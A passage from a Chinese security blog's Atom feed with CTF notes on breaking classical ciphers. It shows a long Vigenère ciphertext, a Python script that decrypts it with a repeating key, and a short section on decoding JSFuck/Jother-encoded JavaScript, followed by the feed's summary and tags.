yekxtvqczleckllxlnridsugkafzrhvcaghljngvoplkiffeknhnstpzhsuewdsedfsttfhnoacpigwhsolpcehrzhtbgvaoeehnstvlrfdglqpmnfhwfpkswehrgunpgwsfjhcihwrydsdnxquxaxljuuhvwzrulsxikhsruroawqrcynqnsmqvdruooylgveotriybqxhrkkifheeorrwrtmxituhiphwsenefkermvwiaverrvlvdtnutdotswvqchuhlfcrviipltebolpcegiidhvvglzfinruxwyoxyplvcaclvscylipbqxyprbrflvfkoqrsbgkitsizqejwwxsvgaoylgvsenusepgzovfagbieetmnosepcxhnyaunwlvceqworiyoagkaftleeeaeptsmevojgdieowgpbooedivleezdwpkxlcnvqtztkxtyhyoxhwrwiphelbuxhrpwbqwlvjmnnesmtwmnohsedkrtnpkaabgvfvyaoqymtpfermlkcxeesezydvrwiphczugwucrjozxwycobpstbvmntrjwglwrmlhhclbgvpvohoevqfviajaswqoauwdspdxvcpvollzsyefwecavectcrdnoajiaqpehfwsyprpxrcmpxiqhjhvwctciflsnwotohqzsqecyprvqamqnmtlwkfrpidmeedpzmofesrnspuenwiajahiaxhrfwhrutzwlnutptnwaylysgkekznrviomqjtuhiifkvfzmjllwucoeuhnhnopvcaagtsmqxhruowqhazwlzdkppgvsurnhruwypbehavaqjfgzkdvhgvdfermepgqufkncbpsepsvgeximisuhnguumevszdlwmtxhnqajruaytlrdnzbjirpdqgrvlvcnrfkewivojkeuulrkztuhtcmgwwuhnsnsmxpoapidbcoefkafsrvrdeeseybymtuvkarhjwzrgdltkgfrvqcguhvjplseansvshrujcepecsevjheajisgxipyhwlaoadsxinpefwwhrdrufsrvtsmoysuukczwsipapkaxwtiacsnccumreeuhirpvxhrfdsfkmipcnwcsirxeevelclkrydchpamtefvvdtbrxdlnudslvkrvvwwhvrrwzrgkeocelefvktgkiyzufhwsqelhrgazvyiidtbdfcwijobwioadpznebespzxisgkeggueedapwizvcrdnipsedtvcpyhxtvigoayaffdxzznjltsbjiferczrwwyprfhlqqpxogkavbxwvehrgunpgwsffkcxlwksrbziyofmsuhooagqrviajadwwttudpvnvxfzmhfhamrteezdwpkgrfsrvawqeituhzipkijdaaghpzdebleqharxkseprovwtkrvqjwajgypsulrpkcxtbvjsrcimtoyhnetaelvfawfjmmpngkemidcblwdsqxgypsfdnobqleevqfcumjptuhbljaxueqowawsraitwhpkjisulnspdxraprdrdqpeteharvuiteiajhpzvstuhioeflylrrvhzcuihrgegnstvlrfeuepkwgeljfrpezysohhtvfxosokogrrzesbzntvvlenlnderqgeiajawqeitbuaanuoksagvhppcwoswabfhielcnwwtbjsugdcfvqflenryeciiviazehuryklcnwcsirxeevajrqedldghaaitxynoeqreitzmrvarcgwtnwwangxvlpnutjinsntzehuwlvxaefhsitituhdogwiilnqdvpzaxiehzrbuqffsrzhzncplfdozrhtwcedxeybncoaouhbeimtoyhnetaaoxhjicpsdpngvllbgvblwdszdvtshnuelvfxhrkwhghvksepkaciexeevcwihectcrpaygtmdqoagnqhjeoeledqpglhgebtwlvqazrudejcifdnoihrctkrdwcqvmntgagxwlvsagweczgzenoohudxkselkagmvianohrnbfvnahveeqoihnvlialwypdulmmggxeeqwzybwklnqlnravmlydpdzwireizhawqeibrfkarvmeduyweoiphtvuarbifvtnteoxjcvdrgswgkvzodyhslvfwhroaoihwtwavpiyovlaglpknvxypsgxptlgwtghwdnuxpehnwssmjedryafohieeonoinmvvyvqchbsprjcerqfmvaigkwtydqzygbfhlxvirrlcvgwlvburhndktsqhhpueryeoaylcptgevrvpvrwiraaewylvfinghnggkixlrqhnhpgvefkaqbpijfpbqtszgilvyebtsprjiajclzfwpnljhvqkksejkiemtssrvkbnusjptehecmffepdqgrwlvburhnznjiaewovnwijhhvwecwuisnsncphwjtoarfxwticnuzgxlrxdaagqfmgrsnqzsihrksejkiemtebolpsawiidtuhglzfinnoeqrwlvymrhtdbjikvqcoagulpeawhpywieadbwtxvvoisiincnxtbshsnvizyterdfkgwhrupfngidlrxshciuiosiswgklzdhrddhpkghfkaigwiidagwhpanmguwagggmjdaglsqiexibqswgkejfbwhceinmcrlowaymkpdbuszugqitkpgnbsioeehdewrpaldcozhswnrbtupbymtuwdsdxivyaagtsmtisgrbvruwlmjrftdjwxtuhcozhultcxoyomugeagowawstsabvltdgjlnpebtrwrcehveoiuqayoahfdruseqjeswiwafewzyveeoaylcpwpgenjwwapivesgkenpgwhvuaqnwxypqhheywhlenupggkiezrqhrdbjicnwpcohfvsengeowppygrdoihlvcekhcfbksnruyczsprtngkaebjmsvveacrwjtbyhstveituhdsngmjllywhlbeenohosrqswsizeeniwwegkaqnwfvwoajsewvleqxyvrvwksedxepvkwperidghhkzrroelagxhrgqquhwjqrbppcqusngrnsfrpmptuhmlbvirpkwdghvetnrwhpuqgkgxnhyhwjeoebtsmfycuhogvvfizutktewvlepukehhxxcohqdlbcpiphofrtyvdtfkeccomnnwagbqjzydvqgxwtelfljsihvpehvqglzqynqkafgkihferqoqpgergvzwfpmjdefkecekxhgkahuuireoshxpkwxibqwbqvlvtnguooceisnoeqrwsksetuyapqrwurpoxhwyprgrtsmoscxwqfgoiksezrcvbwvtyhegihvpdaqhvpvvlohjdvrkejyofrrcwyleguesfwskplykidavsrldxchwlfhhrxsplvsbrdnsnoxlctyhiyaelobosvvflksetuyapqriawafextkdsbwhlbvlelfwbcoeplgnpenpcttrupsaossdtruqfifviyoahuhqfnkgxretgenqwdstucgsoagaykgxogkazbewkprdxaozkplrzdwyhectcruenqvisedpvrumenoeuenbnctvvpvrysznebitsmnsbfwafgkidzcxwucbnisvqcggkidmenxttnwpsbxlrhumerwulcsbjigeblvbqhilgfdltkgewnbbcedrzxprqdtvixrvdhqudtkprroegmpahbvpcyhxyptnutdinmcrdphrqhjltelawqpahvfdhuhoelvrrfsmcvtfloopfyjpdbisemcpiajpvrtyvpnfwacbuxhrmqfllwtzmcrsplqjvnuechveetmnostvepuqljuolpcehroikithtuhsvvwiilbolttavleprqfgvxifmchtpzcrdgkaxhgkvtsgkevqpkoskaoewwufrvqgepgtrbfasqlrxdaylcpnkrdfwdogvlvtsfwellkpytukkvqkclrthrepghoepkifhwtzlqvawqeiaagpsyowyprfkesiuroelcvgwsxcojdtdcelaedlwqsetpaagtlsgypnohhuhezcaylcpaesfsvwbqfecwsgkeowtqohvagnfgldagloyzkhipxhchvfvnahvepdgvybqauerajlnqvhpkcrnbwdsysmkxenqwsqniwvwjsfvijltgkeezkelvqyzhgikseudtemtahbgegcoirdefdnontysguwhrvxypkvqgeptsutkdwflrutrrftlvuaeevpcgkihfefwizvkrgnqzhuhhlnhrvsdkqskpkwdghvkheyyeltkgefhrwqhrtpaylcpquxhrqyoyoiufpnvahqvrefvovrdgttdrqtltnckaryyfrzvctuhjfzafokzehuwlvlnvpawakrsvgaoagxypkvqgzzfirfwdsnqmdllfwommrpaphzpnfozytbwhpqtwenwoprisiptuhtcqcpcbqpwaxijehrniyocrddxasarvuprnoinmvsbrjkbrfmktntuuwmcplchngbqwdzrrwhlvcqiyhdwtkxfwenyeepggohupphwectcrgidxwxefwdsvunlogrpeybcrdehbifhwkzlrdvpajiaejqsfzmkstuhktvienqtqsrqswsenutdwxirgkafvgmtflbxsazqgergebtvimpngxawtavesxowajxfsoyghpzvsntxahuhulpeavhzcvwhrubozlpzlrbifhqvlhrudsngfleaylcpquynninovggrwlvqgepgqohwwgwxwklpnfkzneerqvfifwejehrbseitxtbvsoepsmpruhrltkgefvegghvnlkrvhpzwtferioquirxbexssqpkwudphhurjzugwommusmroaoihwrydartlajswruktcoeptntfaclujrbpwzvfijqaphawqeilrdrsfkiidifwecwpxhrewbxwszxatlnpinptuhyielsldhnsppvkrgfikfuhvjpls'</span></div><div class="line">ascii=<span class="string">'abcdefghijklmnopqrstuvwxyz'</span></div><div class="line">keylen=len(key)</div><div class="line">ctlen=len(ciphertext)</div><div class="line">plaintext = <span class="string">''</span></div><div class="line">i = 0</div><div class="line"><span class="keyword">while</span> i &lt; ctlen:</div><div class="line">    j = i % keylen</div><div class="line">    k = ascii.index(key[j])</div><div class="line">    m = ascii.index(ciphertext[i])</div><div class="line">    <span class="keyword">if</span> m &lt; k:</div><div class="line">        m += 26</div><div class="line">    plaintext += ascii[m-k]</div><div class="line">    i += 1</div><div class="line">with open(<span class="string">'result.txt'</span>,<span class="string">'w'</span>) as f:</div><div class="line">    f.write(plaintext)</div></pre></td></tr></table></figure></p>
<h3 id="jsfuck-or-jother"><a href="#jsfuck-or-jother" class="headerlink" title="jsfuck or jother"></a>jsfuck or jother</h3><p>以下内容参考：<a href="http://www.secbox.cn/hacker/ctf/8078.html" target="_blank" rel="external">http://www.secbox.cn/hacker/ctf/8078.html</a><br>密文例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="linediv></pre></td></tr></table></figure></p>
<p>解密方法：alert(xxx)、console(xxx)、document.write(xxx)，xxx为密文内容。<br>在线解密：<a href="http://www.jsfuck.com/" target="_blank" rel="external">http://www.jsfuck.com/</a></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>关于Base64/16进制／URL编码／js编码／HTML编码等转化以及各种混淆技术，这里不再介绍，有很多在线转化工具。<br>关于CTF更多内容，可参考个人项目：<a href="https://github.com/tengzhangchao/CTF-LEARN" target="_blank" rel="external">https://github.com/tengzhangchao/CTF-LEARN</a></p>
<p><em>说明：以上脚本若有运行错误或者编写错误可留言告知；若有补充可留言说明；另外本篇有些代码来自早期互联网收集，已遗忘原地址，若有知者望告之，在此表示感谢！</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;科技的精灵已经从瓶中跑了出来，但我们还不知道真正降临的时刻&lt;/blockquote&gt;&lt;br&gt;　　今日在翻看笔记的时候，无意看到了之前为参加CTF时做的准备工作，主要包括了各种加密解密，web安全，PWN溢出等内容的练习题以及解决脚本。由于内容部分来自本人参加ctf时所做的题以及部分来自互联网，因此准备在此分享记录一番。本篇主要介绍几种CTF中常见加密算法的解密脚本，关于加密原理会适当提及，但不会深入。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="CTF" scheme="http://thief.one/tags/CTF/"/>
    
      <category term="加密与解密" scheme="http://thief.one/tags/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    
      <category term="隐写术" scheme="http://thief.one/tags/%E9%9A%90%E5%86%99%E6%9C%AF/"/>
    
  </entry>
  
</feed>
